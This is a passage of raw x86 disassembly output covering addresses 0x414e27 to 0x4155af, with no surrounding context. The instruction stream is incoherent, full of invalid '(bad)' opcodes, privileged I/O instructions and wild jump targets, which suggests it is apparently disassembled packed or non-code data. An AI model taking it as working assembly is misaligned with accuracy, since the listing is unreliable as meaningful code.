  414e27:	mov    eax,edx
  414e29:	sbb    al,0xf5
  414e2b:	or     ecx,esp
  414e2d:	mov    DWORD PTR [edx],ebx
  414e2f:	pop    ecx
  414e30:	std    
  414e31:	mov    dl,0xe1
  414e33:	mov    edx,0x221ebc
  414e38:	xor    DWORD PTR [ecx],eax
  414e3a:	xor    al,0x25
  414e3c:	stos   DWORD PTR es:[edi],eax
  414e3d:	popf   
  414e3e:	inc    ecx
  414e3f:	les    edi,FWORD PTR [ebx]
  414e41:	repnz sub DWORD PTR [ebx+0x65cc3cfa],edi
  414e48:	sbb    edi,DWORD PTR [edi+0x6bab73d8]
  414e4e:	add    ch,BYTE PTR [edi-0x7689aba]
  414e54:	sbb    DWORD PTR [ebx+0x5f],0xddc37b23
  414e5b:	pop    edx
  414e5c:	pop    DWORD PTR [eax+0x7e1282d0]
  414e62:	lds    eax,FWORD PTR [edx+edi*8]
  414e65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e66:	jle    0x414e27
  414e68:	xor    eax,0x62f1d91
  414e6d:	jbe    0x414eb1
  414e6f:	int    0x21
  414e71:	inc    edx
  414e72:	jnp    0x414ed3
  414e74:	push   cs
  414e75:	cs xchg ebx,eax
  414e77:	mov    ecx,0xbfa2c0ad
  414e7c:	jle    0x414ee4
  414e7e:	add    BYTE PTR [edi+ebx*4],bh
  414e81:	xor    bl,ah
  414e83:	scas   eax,DWORD PTR es:[edi]
  414e84:	mov    ebx,esi
  414e86:	(bad)  
  414e87:	mov    bh,0x66
  414e89:	push   ecx
  414e8a:	jle    0x414eff
  414e8c:	call   0xb851:0x68a65398
  414e93:	add    al,0x7d
  414e95:	adc    BYTE PTR es:[eax+0x3b],ch
  414e99:	in     eax,dx
  414e9a:	pop    eax
  414e9b:	mov    ah,0xdb
  414e9d:	inc    edx
  414e9e:	and    DWORD PTR [edi+ebx*4+0x72a838c7],0x68612c36
  414ea9:	sub    eax,0x582c5c77
  414eae:	rol    BYTE PTR [ebx-0x12],cl
  414eb1:	cli    
  414eb2:	add    ecx,ebx
  414eb4:	inc    esi
  414eb5:	pop    ecx
  414eb6:	fbstp  TBYTE PTR ds:0xda8c4e95
  414ebc:	enter  0x8f56,0xe6
  414ec0:	cdq    
  414ec1:	adc    BYTE PTR [edi+0x55],0xba
  414ec5:	inc    ebx
  414ec6:	add    edx,ebp
  414ec8:	ins    BYTE PTR es:[edi],dx
  414ec9:	stos   DWORD PTR es:[edi],eax
  414eca:	pop    eax
  414ecb:	sbb    BYTE PTR [ebx],ah
  414ecd:	add    DWORD PTR [ebp+0x67],ecx
  414ed0:	push   cs
  414ed1:	retf   0xf309
  414ed4:	pop    eax
  414ed5:	mov    bl,0xd1
  414ed7:	mov    ds:0x8a19eb12,al
  414edc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414edd:	or     al,0x3
  414edf:	inc    ebp
  414ee0:	(bad)  
  414ee1:	imul   ecx,DWORD PTR [edx-0x6eea0f7f],0x4f
  414ee8:	xchg   ebx,eax
  414ee9:	fstp   DWORD PTR [esi+0x7fe81005]
  414eef:	mov    cl,BYTE PTR [ebx]
  414ef1:	adc    eax,0x198b925b
  414ef6:	add    DWORD PTR [ebx],ebx
  414ef8:	icebp  
  414ef9:	jne    0x414f4b
  414efb:	dec    ebp
  414efc:	les    edx,FWORD PTR [ebp+0x707ff9a3]
  414f02:	(bad)  
  414f03:	sub    DWORD PTR es:[edx-0x13],0x7b
  414f08:	xchg   ebx,eax
  414f09:	stos   BYTE PTR es:[edi],al
  414f0a:	mov    ch,0xd5
  414f0c:	adc    eax,edx
  414f0e:	call   DWORD PTR [esi-0x3f]
  414f11:	pop    ebp
  414f12:	push   esi
  414f13:	mov    ebp,0x16a9ea58
  414f18:	sbb    ebx,DWORD PTR [eax-0x41]
  414f1b:	add    eax,0xe584f432
  414f21:	retf   0xe49
  414f24:	push   0xffffffde
  414f26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f27:	shl    DWORD PTR [eax],1
  414f29:	jne    0x414ed9
  414f2b:	outs   dx,BYTE PTR ds:[esi]
  414f2c:	aam    0xb7
  414f2e:	ja     0x414f8f
  414f30:	mov    BYTE PTR [eax-0x7666a74c],ch
  414f36:	cdq    
  414f37:	pop    DWORD PTR [ebx+0x1d0f0fbe]
  414f3d:	aaa    
  414f3e:	out    dx,al
  414f3f:	jbe    0x414ef0
  414f41:	push   ebx
  414f42:	mov    dl,0xee
  414f44:	xor    eax,0xc33ea8d2
  414f49:	xor    ecx,ecx
  414f4b:	or     BYTE PTR [ebp-0x34837178],ah
  414f51:	pop    ss
  414f52:	outs   dx,BYTE PTR ds:[esi]
  414f53:	das    
  414f54:	mov    ds:0x912e47ae,al
  414f59:	or     al,0x4b
  414f5b:	rol    BYTE PTR [ecx+0xa098abc],1
  414f61:	pop    edi
  414f62:	sahf   
  414f63:	jecxz  0x414fd6
  414f65:	xor    BYTE PTR [eax+edi*2],bl
  414f68:	idiv   DWORD PTR ds:0xeb03c872
  414f6e:	fwait
  414f6f:	add    dl,bh
  414f71:	mov    ah,0x5d
  414f73:	loopne 0x414f58
  414f75:	loop   0x414f60
  414f77:	cwde   
  414f78:	inc    edi
  414f79:	sti    
  414f7a:	pop    esp
  414f7b:	bound  edi,QWORD PTR [edi]
  414f7d:	or     ecx,DWORD PTR [esi+edx*1+0x40]
  414f81:	push   ebx
  414f82:	push   ecx
  414f83:	mov    bl,0xec
  414f85:	or     eax,0x1a1b1502
  414f8a:	jo     0x414f40
  414f8c:	ins    BYTE PTR es:[edi],dx
  414f8d:	outs   dx,DWORD PTR ds:[esi]
  414f8e:	mov    esp,0xd3cc908d
  414f93:	push   ebx
  414f94:	jne    0x414fea
  414f96:	pushf  
  414f97:	(bad)  
  414f98:	int3   
  414f99:	fwait
  414f9a:	inc    BYTE PTR [eax+0x4d]
  414f9d:	mov    bh,0xdd
  414f9f:	xchg   DWORD PTR [eax-0x6a],esp
  414fa2:	stos   BYTE PTR es:[edi],al
  414fa3:	scas   eax,DWORD PTR es:[edi]
  414fa4:	in     al,0x83
  414fa6:	push   esi
  414fa7:	mov    ch,0xf3
  414fa9:	inc    edi
  414faa:	dec    edx
  414fab:	mov    ebp,0xd1db03d3
  414fb0:	sbb    BYTE PTR [eax+0x2a],ch
  414fb3:	adc    ebx,DWORD PTR [eax+0x12]
  414fb6:	iret   
  414fb7:	cld    
  414fb8:	or     eax,0xc3f0b410
  414fbd:	dec    edi
  414fbe:	or     ch,BYTE PTR [edx-0x74]
  414fc1:	jnp    0x414fa9
  414fc3:	loopne 0x415012
  414fc5:	ja     0x414f9b
  414fc7:	xchg   edx,eax
  414fc8:	mov    ebp,0xa618dc2b
  414fcd:	outs   dx,BYTE PTR ds:[esi]
  414fce:	stos   DWORD PTR es:[edi],eax
  414fcf:	xchg   ecx,eax
  414fd0:	adc    ah,BYTE PTR [edi+0x69]
  414fd3:	or     BYTE PTR [ebp+0x26f1c2ac],dl
  414fd9:	mov    ebp,0x363c71e9
  414fde:	push   ebp
  414fdf:	in     al,dx
  414fe0:	scas   al,BYTE PTR es:[edi]
  414fe1:	jno    0x414f95
  414fe3:	das    
  414fe4:	pusha  
  414fe5:	test   BYTE PTR [eax+0x664b169c],bh
  414feb:	stos   DWORD PTR es:[edi],eax
  414fec:	jae    0x414f80
  414fee:	push   edx
  414fef:	dec    ebx
  414ff0:	fild   WORD PTR [edi+ecx*4]
  414ff3:	mov    al,ds:0xb3ad1d54
  414ff8:	in     eax,dx
  414ff9:	stos   DWORD PTR es:[edi],eax
  414ffa:	jg     0x414fea
  414ffc:	jecxz  0x414fe8
  414ffe:	shl    BYTE PTR [ecx-0x29572e0d],0xad
  415005:	pop    ebx
  415006:	jns    0x414ffd
  415008:	lods   eax,DWORD PTR ds:[esi]
  415009:	push   edx
  41500a:	sub    DWORD PTR [ecx+0x21a3985b],edi
  415010:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415011:	fsubr  DWORD PTR [edx]
  415013:	loope  0x414fcf
  415015:	cwde   
  415016:	cmp    edx,esi
  415018:	aaa    
  415019:	es add edx,esp
  41501c:	les    esi,FWORD PTR es:[ecx]
  41501f:	xor    al,BYTE PTR [ebx-0x1eb53ae7]
  415025:	dec    ebp
  415026:	mov    dh,0x40
  415028:	aas    
  415029:	fs mov esp,0x5ac2552f
  41502f:	stc    
  415030:	pop    ecx
  415031:	aas    
  415032:	rcr    ebp,cl
  415034:	jp     0x414fc1
  415036:	repnz or eax,0x2c9cc82f
  41503c:	jnp    0x415043
  41503e:	pop    eax
  41503f:	call   DWORD PTR [edi]
  415041:	repz or cl,cl
  415044:	ret    
  415045:	mov    dh,0x2c
  415047:	cmp    dl,ah
  415049:	xor    al,0x3f
  41504b:	pop    ss
  41504c:	add    eax,0x21661655
  415051:	and    ch,al
  415053:	gs sar ebp,cl
  415056:	(bad)  
  415058:	sub    eax,0x12a0b823
  41505d:	clc    
  41505e:	dec    ebp
  41505f:	popf   
  415060:	das    
  415061:	mov    ah,0x88
  415063:	inc    ecx
  415064:	iret   
  415065:	mov    BYTE PTR [esi+0x1448d03d],dh
  41506b:	(bad)  
  41506c:	cmp    BYTE PTR [ecx+eax*8-0x497f6f74],cl
  415073:	je     0x4150c2
  415075:	adc    eax,DWORD PTR [eax+esi*8]
  415078:	add    BYTE PTR [eax+0x63],0xac
  41507c:	inc    ebp
  41507d:	cmc    
  41507e:	arpl   WORD PTR [eax-0x19],sp
  415081:	and    ch,dh
  415083:	loope  0x415059
  415085:	inc    edx
  415086:	cli    
  415087:	out    dx,eax
  415088:	fisttp WORD PTR [ebx+0x71112b87]
  41508e:	sub    BYTE PTR [ebp+0x43e34431],ah
  415094:	jne    0x4150bc
  415096:	mov    ds:0x569ddd29,al
  41509b:	mov    es,WORD PTR [ecx+esi*1-0x3faaf0ab]
  4150a2:	jae    0x4150c7
  4150a4:	add    edi,DWORD PTR [esi+esi*2+0x7663dbe0]
  4150ab:	jnp    0x415072
  4150ad:	ret    
  4150ae:	mov    ebp,0x4cbd6f7e
  4150b3:	or     bl,BYTE PTR [ebx-0x57903132]
  4150b9:	call   0xd1e53c82
  4150be:	cmovl  ecx,edi
  4150c1:	mov    dh,0x15
  4150c3:	loop   0x41509f
  4150c5:	aad    0x2
  4150c7:	jmp    0x1d514afb
  4150cc:	vpaddsb ymm5,ymm7,YMMWORD PTR [ebx+ebp*4-0x7c]
  4150d2:	bound  edi,QWORD PTR [esi-0x61cc85e1]
  4150d8:	mov    edx,0x74c241b9
  4150dd:	clc    
  4150de:	out    dx,al
  4150df:	jp     0x4150b6
  4150e1:	stos   BYTE PTR es:[edi],al
  4150e2:	mov    ch,0xfa
  4150e4:	push   DWORD PTR [edi-0x2e627b61]
  4150ea:	mov    ebp,0xa693719b
  4150ef:	inc    ebp
  4150f0:	std    
  4150f1:	or     esi,DWORD PTR [eax]
  4150f3:	mov    edx,0xf06dd857
  4150f8:	loop   0x4150d5
  4150fa:	push   es
  4150fb:	sub    eax,0x53fc7a70
  415100:	push   esi
  415101:	mov    gs,ebp
  415103:	jle    0x4150f6
  415105:	push   es
  415106:	cmp    DWORD PTR [edi],edi
  415108:	xchg   ecx,eax
  415109:	fild   DWORD PTR [esi-0x3f]
  41510c:	pop    edx
  41510d:	aaa    
  41510e:	mov    eax,ds:0x7449bdb2
  415113:	push   ss
  415114:	fdiv   DWORD PTR [ebp+0x5098efad]
  41511a:	iret   
  41511b:	cmp    ebp,eax
  41511d:	repnz aas 
  41511f:	jbe    0x41517f
  415121:	sar    DWORD PTR [edx-0x1a],1
  415124:	and    al,0x45
  415126:	call   0x280860b
  41512b:	aaa    
  41512c:	int3   
  41512d:	in     eax,0xf4
  41512f:	pop    ds
  415130:	call   0x180aaf20
  415135:	add    al,BYTE PTR ds:0xffdf0387
  41513b:	adc    al,0xf4
  41513d:	les    ebp,FWORD PTR [ebx-0x5a]
  415140:	jb     0x4150ce
  415142:	(bad)  
  415143:	scas   al,BYTE PTR es:[edi]
  415144:	push   esp
  415145:	or     cl,BYTE PTR [ebp+0x53]
  415148:	fidivr WORD PTR [esi]
  41514a:	xlat   BYTE PTR ds:[ebx]
  41514b:	sub    ebx,DWORD PTR [edi+0x5e1840c8]
  415151:	sahf   
  415152:	lahf   
  415153:	and    ebp,ebx
  415155:	jb     0x4151d5
  415157:	cs pop ecx
  415159:	jb     0x41518a
  41515b:	call   0x485d:0x1f57648a
  415162:	jns    0x415184
  415164:	push   ecx
  415165:	cmp    ecx,DWORD PTR [ecx+0x36919a42]
  41516b:	pop    esp
  41516c:	pop    ss
  41516d:	sbb    ah,BYTE PTR [esp+ebp*1-0x54]
  415171:	ds inc edi
  415173:	push   edi
  415174:	sbb    al,0x2e
  415176:	aaa    
  415177:	sub    esi,DWORD PTR [eax]
  415179:	adc    al,0x7e
  41517b:	cmp    al,0x5e
  41517d:	and    cl,BYTE PTR ds:0x2e8ff41c
  415183:	iret   
  415184:	mov    bh,0xcd
  415186:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415187:	(bad)  
  415188:	mov    ebp,0xad64a351
  41518d:	daa    
  41518e:	ss jbe 0x4151c9
  415191:	(bad)  
  415192:	aad    0x4
  415194:	push   eax
  415195:	in     eax,dx
  415196:	jo     0x4151a6
  415198:	add    ebx,ecx
  41519a:	or     al,0x4b
  41519c:	loop   0x41513f
  41519e:	(bad)  
  41519f:	adc    ebx,esp
  4151a1:	scas   eax,DWORD PTR es:[edi]
  4151a2:	jp     0x415176
  4151a4:	ret    
  4151a5:	ds add al,0xe9
  4151a8:	sub    eax,0x1aa1855b
  4151ad:	xchg   ecx,eax
  4151ae:	sti    
  4151af:	daa    
  4151b0:	xor    dh,BYTE PTR [edi+0x35]
  4151b3:	sub    esp,DWORD PTR [ebx]
  4151b5:	ror    DWORD PTR [edi],0x8c
  4151b8:	stos   BYTE PTR es:[edi],al
  4151b9:	mov    eax,ds:0xd17e5a8a
  4151be:	jno    0x41520e
  4151c0:	iret   
  4151c1:	xor    BYTE PTR [esi+ebp*1-0x4aa4aff5],cl
  4151c8:	ret    
  4151c9:	mov    dl,0xb8
  4151cb:	push   edi
  4151cc:	(bad)  
  4151ce:	mov    bh,0x10
  4151d0:	add    al,0x53
  4151d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4151d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151d4:	cmp    DWORD PTR [ebx-0x936b961],esi
  4151da:	cmp    al,0xf5
  4151dc:	sbb    BYTE PTR ds:0x1b96d733,0xc0
  4151e3:	sbb    al,0x8a
  4151e5:	stos   DWORD PTR es:[edi],eax
  4151e6:	pop    edx
  4151e7:	cld    
  4151e8:	mov    WORD PTR [edx-0x37e3544],?
  4151ee:	mov    al,0xfa
  4151f0:	out    dx,eax
  4151f1:	out    dx,eax
  4151f2:	stos   BYTE PTR es:[edi],al
  4151f3:	pop    es
  4151f4:	xor    eax,0xc4d3e205
  4151f9:	cs push eax
  4151fb:	inc    DWORD PTR [esp+ebp*1]
  4151fe:	or     BYTE PTR [ebx+edx*2+0x4b969b66],bh
  415205:	fs ss or al,0xa0
  415209:	out    0xa4,al
  41520b:	ror    DWORD PTR [eax+0x67],0xea
  41520f:	cmp    al,0x76
  415211:	setno  BYTE PTR [edx*8-0x5c46be01]
  415219:	fdiv   st,st(4)
  41521b:	mov    dl,BYTE PTR [eax+0x3f751dc9]
  415221:	inc    esi
  415222:	or     BYTE PTR [esi+0x25c25d2d],bh
  415228:	or     DWORD PTR [ebp+0xfa0f929],eax
  41522e:	inc    ebp
  41522f:	cmp    dh,cl
  415231:	cwde   
  415232:	mov    dh,0x9f
  415234:	icebp  
  415235:	xor    al,0xcb
  415237:	or     edi,DWORD PTR [ebx-0x8]
  41523a:	and    al,0xc0
  41523c:	aaa    
  41523d:	cmp    al,0x15
  41523f:	(bad)  
  415240:	out    dx,eax
  415241:	pop    eax
  415242:	leave  
  415243:	ret    
  415244:	cmp    bl,al
  415246:	nop
  415247:	sar    DWORD PTR [edx],0x4d
  41524a:	cld    
  41524b:	popa   
  41524c:	int3   
  41524d:	sti    
  41524e:	and    eax,0x542e5c4
  415253:	mov    esp,0x9e89af1
  415258:	inc    ecx
  415259:	in     eax,0x94
  41525b:	aas    
  41525c:	mov    bl,0xdf
  41525e:	inc    ecx
  41525f:	xchg   DWORD PTR [edx],eax
  415261:	jno    0x41526b
  415263:	or     al,BYTE PTR [ebx+esi*8-0x2c]
  415267:	in     al,0xe3
  415269:	retf   0x15b1
  41526c:	mov    eax,ds:0x6c7702c1
  415271:	shl    BYTE PTR [edi],0xf2
  415274:	jp     0x4152c5
  415276:	in     eax,0x47
  415278:	outs   dx,DWORD PTR ds:[esi]
  415279:	jecxz  0x4152b2
  41527b:	bound  edi,QWORD PTR [ebx]
  41527d:	sub    edi,edx
  41527f:	test   ah,0x5d
  415282:	adc    DWORD PTR [edi-0x53],edx
  415285:	arpl   WORD PTR [esi+eax*8],sp
  415288:	xchg   edi,eax
  415289:	cmp    ebx,esp
  41528b:	adc    DWORD PTR [esi+esi*2],ecx
  41528e:	xor    al,0xc7
  415290:	test   ah,ch
  415292:	lgs    ecx,FWORD PTR [edi-0x49]
  415296:	test   eax,0xa113d4dc
  41529b:	add    ecx,DWORD PTR [ecx+0x6b4eea34]
  4152a1:	arpl   bx,ax
  4152a3:	pop    edi
  4152a4:	imul   ebx,edx,0x9b3251a7
  4152aa:	lahf   
  4152ab:	adc    esi,ebx
  4152ad:	int    0xdb
  4152af:	test   eax,0x9a493990
  4152b4:	inc    esp
  4152b5:	data16 sub cl,BYTE PTR [edi-0x7a]
  4152b9:	mov    ch,0xa2
  4152bb:	js     0x415277
  4152bd:	pop    ds
  4152be:	ins    BYTE PTR es:[edi],dx
  4152bf:	sti    
  4152c0:	inc    esp
  4152c1:	dec    edi
  4152c2:	jmp    0x38eb7615
  4152c7:	cmp    eax,0x6565aefa
  4152cc:	sbb    dl,BYTE PTR [edi]
  4152ce:	dec    esp
  4152cf:	push   DWORD PTR [ebx]
  4152d1:	and    DWORD PTR [ebx],esi
  4152d3:	lea    ebp,[edx+0x7e12b609]
  4152d9:	or     al,0x39
  4152db:	scas   al,BYTE PTR es:[edi]
  4152dc:	(bad)  
  4152dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152de:	lock mov al,ds:0x3298f7f6
  4152e4:	mov    DWORD PTR [esi+eiz*2],edi
  4152e7:	and    DWORD PTR [edx],0xffffff8b
  4152ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152eb:	fmul   QWORD PTR [ecx]
  4152ed:	es pop ds
  4152ef:	jno    0x415333
  4152f1:	test   ah,al
  4152f3:	mov    al,0x3f
  4152f5:	jno    0x415306
  4152f7:	or     BYTE PTR [ebx],bl
  4152f9:	fild   QWORD PTR [edx+0x1c26807e]
  4152ff:	arpl   WORD PTR [ecx+0xb18cab3],bp
  415305:	call   0x5b184c7
  41530a:	cdq    
  41530b:	add    ch,BYTE PTR [ecx+0x4b]
  41530e:	(bad)  
  41530f:	int3   
  415310:	in     al,0x9b
  415312:	xlat   BYTE PTR ds:[ebx]
  415313:	lea    ecx,[edi-0x3d]
  415316:	sahf   
  415317:	and    BYTE PTR [edi+ebp*8+0x19c1adf4],ah
  41531e:	pop    es
  41531f:	out    dx,al
  415320:	out    dx,al
  415321:	imul   ebx,DWORD PTR [edx-0x51eacfc9],0x3f436c3a
  41532b:	ror    BYTE PTR [edx],1
  41532d:	xchg   esp,eax
  41532e:	mov    ebp,0xb2980ea4
  415333:	fist   WORD PTR [ecx-0x22]
  415336:	dec    ebx
  415337:	mov    bh,0xc2
  415339:	or     edi,DWORD PTR [edx]
  41533b:	loopne 0x4152e5
  41533d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41533e:	adc    DWORD PTR [edi],ebx
  415340:	mov    bh,0xed
  415342:	es daa 
  415344:	cmp    dh,bh
  415346:	pusha  
  415347:	cmp    eax,0xc0314543
  41534c:	stos   DWORD PTR es:[edi],eax
  41534d:	mov    gs,WORD PTR [edx]
  41534f:	mov    cl,0x51
  415351:	jl     0x41537a
  415353:	or     DWORD PTR [edi+0x78],eax
  415356:	hlt    
  415357:	fcomp  QWORD PTR [ebx+0x4c]
  41535a:	in     al,0x9a
  41535c:	outs   dx,DWORD PTR ds:[esi]
  41535d:	out    0xf0,eax
  41535f:	xor    al,BYTE PTR [ecx]
  415361:	push   ds
  415362:	loope  0x4152e6
  415364:	jae    0x4153c2
  415366:	addr16 push esp
  415368:	and    al,0x7e
  41536a:	data16 cmp BYTE PTR [edx],al
  41536d:	jg     0x415317
  41536f:	test   DWORD PTR [ebp-0x3279cbdd],esi
  415375:	adc    cl,bl
  415377:	inc    ebx
  415378:	stos   DWORD PTR es:[edi],eax
  415379:	pop    ds
  41537a:	fild   DWORD PTR [ebx-0x62]
  41537d:	into   
  41537e:	and    eax,DWORD PTR [esi]
  415380:	in     al,0x2
  415382:	push   ss
  415383:	mov    dh,0x9d
  415385:	ss es jle 0x41537d
  415389:	je     0x415365
  41538b:	loope  0x415407
  41538d:	xchg   ebx,eax
  41538e:	cmp    edi,ecx
  415390:	dec    ebx
  415391:	fnstenv [ecx-0x67b23b79]
  415397:	(bad)  [edi-0x6b74a2a5]
  41539d:	push   ecx
  41539e:	mov    eax,0x745ab170
  4153a3:	cli    
  4153a4:	cld    
  4153a5:	xlat   BYTE PTR ds:[ebx]
  4153a6:	dec    eax
  4153a7:	xor    al,0x92
  4153a9:	inc    eax
  4153aa:	or     BYTE PTR [eiz*8+0x70557946],dh
  4153b1:	sub    al,0x8f
  4153b3:	ffree  st(1)
  4153b5:	mov    ebp,edx
  4153b7:	ret    
  4153b8:	dec    edi
  4153b9:	inc    edx
  4153ba:	or     DWORD PTR [ecx],edx
  4153bc:	fucomip st,st(7)
  4153be:	fsubr  DWORD PTR [esi+0x4c75b443]
  4153c4:	mov    eax,fs
  4153c6:	jg     0x4153b7
  4153c8:	(bad)  
  4153c9:	xor    esi,ecx
  4153cb:	ss in  al,dx
  4153cd:	mov    ebp,0x26ed69d1
  4153d2:	adc    DWORD PTR ds:0x8b0efbc4,0xffffffdd
  4153d9:	scas   al,BYTE PTR es:[edi]
  4153da:	dec    edi
  4153db:	and    ecx,esi
  4153dd:	mov    DWORD PTR [esi-0x4],ebp
  4153e0:	dec    ecx
  4153e1:	xchg   ecx,eax
  4153e2:	test   DWORD PTR [eax],ecx
  4153e4:	cmp    al,ah
  4153e6:	add    DWORD PTR [ebp+0x5f71ec6f],edi
  4153ec:	or     DWORD PTR [ecx-0xb9a9ead],ebp
  4153f2:	xchg   ebp,eax
  4153f3:	push   ss
  4153f4:	sbb    ecx,DWORD PTR [eax-0x20]
  4153f7:	xor    BYTE PTR [edi-0x2d],dl
  4153fa:	lahf   
  4153fb:	pop    edi
  4153fc:	fisttp WORD PTR [eax]
  4153fe:	sbb    al,0xa9
  415400:	sbb    al,0xe1
  415402:	pop    esi
  415403:	mov    eax,0x2c7067a0
  415408:	jns    0x4153ae
  41540a:	imul   esi,DWORD PTR es:[edi+0x3b8d128c],0x7
  415412:	sbb    al,0x7c
  415414:	hlt    
  415415:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415416:	and    BYTE PTR [ebp-0x42],dh
  415419:	test   eax,0x507911a4
  41541e:	xor    DWORD PTR [esi+edx*4],ecx
  415421:	mov    BYTE PTR [edi],bh
  415423:	ja     0x4153a6
  415425:	mov    ecx,eax
  415427:	adc    DWORD PTR [eax+0x23],eax
  41542a:	mov    ds:0x808b0830,al
  41542f:	sbb    al,0x20
  415431:	pop    ebp
  415432:	adc    al,0x2f
  415434:	and    eax,0xc6290cab
  415439:	pop    ds
  41543a:	and    ah,BYTE PTR [eax+0x6c]
  41543d:	ins    DWORD PTR es:[edi],dx
  41543e:	mov    ah,0x3a
  415440:	(bad)  
  415442:	and    dh,cl
  415444:	je     0x4153ce
  415446:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415447:	aad    0xb5
  415449:	(bad)  
  41544a:	ja     0x415458
  41544c:	jl     0x415406
  41544e:	push   ss
  41544f:	cmp    DWORD PTR [ebp+0x659d3a1d],esi
  415455:	or     BYTE PTR [ecx-0x3e],bh
  415458:	sbb    eax,0xbc9e36c1
  41545d:	mov    ds:0x6db58532,al
  415462:	test   al,0xfd
  415464:	sbb    eax,0x2eeda5dc
  415469:	dec    ebx
  41546a:	retf   
  41546b:	retf   
  41546c:	sar    BYTE PTR [ebp-0x1e0d71cc],1
  415472:	clc    
  415473:	cmp    DWORD PTR [ebx-0x72],0x37
  415477:	fisubr WORD PTR [ebx]
  415479:	inc    edx
  41547a:	imul   esi,DWORD PTR [eax+0x3f],0xffffffab
  41547e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41547f:	(bad)  
  415480:	sbb    bl,BYTE PTR [eax+eiz*4-0x3dac49db]
  415487:	sahf   
  415488:	cmp    bh,bl
  41548a:	xchg   bh,cl
  41548c:	pop    ecx
  41548d:	stc    
  41548e:	lods   al,BYTE PTR ds:[esi]
  41548f:	sbb    al,0xef
  415491:	dec    ebp
  415492:	call   ecx
  415494:	push   0x2c
  415496:	pop    eax
  415497:	test   eax,0x6f60cf22
  41549c:	icebp  
  41549d:	ret    
  41549e:	xor    al,0x3b
  4154a0:	fcmovnb st,st(6)
  4154a2:	add    cl,cl
  4154a4:	push   eax
  4154a5:	mov    ds:0xc0f2398b,eax
  4154aa:	out    0x93,eax
  4154ac:	mov    DWORD PTR [ebx],ebp
  4154ae:	loopne 0x415490
  4154b0:	cmp    BYTE PTR [esi-0x66],cl
  4154b3:	fnstenv [edx-0x2f8405f6]
  4154b9:	stos   DWORD PTR es:[edi],eax
  4154ba:	(bad)  
  4154bc:	js     0x41551c
  4154be:	add    al,0x21
  4154c0:	jnp    0x4154cc
  4154c2:	clc    
  4154c3:	test   BYTE PTR [ecx-0x53d1ed9f],bl
  4154c9:	jmp    FWORD PTR [edx+edi*1]
  4154cc:	ins    DWORD PTR es:[edi],dx
  4154cd:	and    al,0xd8
  4154cf:	xchg   ebp,eax
  4154d0:	outs   dx,BYTE PTR ds:[esi]
  4154d1:	jb     0x4154c6
  4154d3:	retf   0x9ec8
  4154d6:	jmp    0xd22c:0xb23825b6
  4154dd:	outs   dx,DWORD PTR ds:[esi]
  4154de:	xadd   DWORD PTR [ecx-0x1360bb48],ebx
  4154e5:	or     eax,0xbe0f7fe5
  4154ea:	xchg   esi,eax
  4154eb:	adc    dl,0x4b
  4154ee:	xor    esi,DWORD PTR [edx]
  4154f0:	and    al,bh
  4154f2:	lods   eax,DWORD PTR ds:[esi]
  4154f3:	adc    BYTE PTR [esi],ch
  4154f5:	xor    al,0x7e
  4154f7:	(bad)  
  4154f8:	mov    ds:0xe56c0176,al
  4154fd:	mov    esp,0x571eb20c
  415502:	xor    eax,0xf1379ccd
  415507:	rcl    BYTE PTR [ebx+0x2e],1
  41550a:	loopne 0x415520
  41550c:	ins    BYTE PTR es:[edi],dx
  41550d:	jge    0x4154be
  41550f:	loop   0x41550c
  415511:	sub    al,0x17
  415513:	adc    BYTE PTR [edi+0x33],bh
  415516:	dec    BYTE PTR [ebp-0x4b422808]
  41551c:	(bad)  
  41551d:	cmc    
  41551e:	fadd   DWORD PTR [edi-0x76]
  415521:	gs push esi
  415523:	out    0xb8,al
  415525:	mov    gs,WORD PTR [eax+0x448d3b41]
  41552b:	pop    edi
  41552c:	outs   dx,BYTE PTR ds:[esi]
  41552d:	xor    DWORD PTR [eax+0x1c9cb5d3],ecx
  415533:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415534:	lods   eax,DWORD PTR ds:[esi]
  415535:	sbb    BYTE PTR [edx],bl
  415537:	jp     0x415572
  415539:	and    BYTE PTR [ecx+eax*1],bl
  41553c:	imul   ebp,DWORD PTR [ebx+0x401363c6],0x66
  415543:	daa    
  415544:	jp     0x41559a
  415546:	fs adc al,0xa5
  415549:	cmp    DWORD PTR [ebx-0x75],eax
  41554c:	jge    0x415541
  41554e:	test   BYTE PTR [esi+0x24],dh
  415551:	outs   dx,DWORD PTR ds:[esi]
  415552:	sbb    DWORD PTR [edx],esp
  415554:	retf   0xd92a
  415557:	push   ebp
  415558:	in     al,0xcf
  41555a:	imul   edi,DWORD PTR [ebp-0x3c],0x6c
  41555e:	(bad)  
  415560:	in     al,0x94
  415562:	xor    DWORD PTR [eax+0xd],esp
  415565:	push   ebx
  415566:	jno    0x41550e
  415568:	pop    ecx
  415569:	jno    0x415583
  41556b:	ror    DWORD PTR [eax-0x5e],1
  41556e:	in     eax,dx
  41556f:	xchg   BYTE PTR [ecx],cl
  415571:	sub    DWORD PTR [ecx-0x19b11ecc],ecx
  415577:	xor    DWORD PTR [eax+0x5464f450],ebp
  41557d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41557e:	sub    eax,0xd468ae47
  415583:	mov    ah,0x1f
  415585:	jae    0x415519
  415587:	mov    ds:0x89b1cd07,eax
  41558c:	mov    edi,0x587509bd
  415591:	adc    edx,DWORD PTR [ecx]
  415593:	fild   WORD PTR [esi+0x5a82a068]
  415599:	dec    edi
  41559a:	es stos BYTE PTR es:[edi],al
  41559c:	sub    BYTE PTR [edx-0x5e],dh
  41559f:	icebp  
  4155a0:	mov    ch,0xb9
  4155a2:	adc    eax,0xcac7b15f
  4155a7:	add    bl,BYTE PTR [eax-0x1a328a9]
  4155ad:	(bad)  
  4155ae:	xchg   edx,eax
  4155af:	sbb    al,0xfe
